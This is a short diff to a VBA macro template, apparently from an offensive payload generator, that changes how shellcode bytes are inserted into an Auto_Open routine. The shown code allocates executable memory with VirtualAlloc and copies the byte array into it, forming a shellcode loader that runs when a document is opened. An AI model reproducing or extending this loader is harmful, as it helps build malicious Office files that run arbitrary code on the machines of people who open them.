@@ -15,7 +15,7 @@ Sub Auto_Open()
 #Else
 	Dim  %{var_rwxpage} As Long, %{var_res} As Long
 #EndIf
-	%{var_myArray} = Array(%{bytes})
+	%{bytes}
 	%{var_rwxpage} = VirtualAlloc(0, UBound(%{var_myArray}), &H1000, &H40)
 	For %{var_offset} = LBound(%{var_myArray}) To UBound(%{var_myArray})
 		%{var_myByte} = %{var_myArray}(%{var_offset})
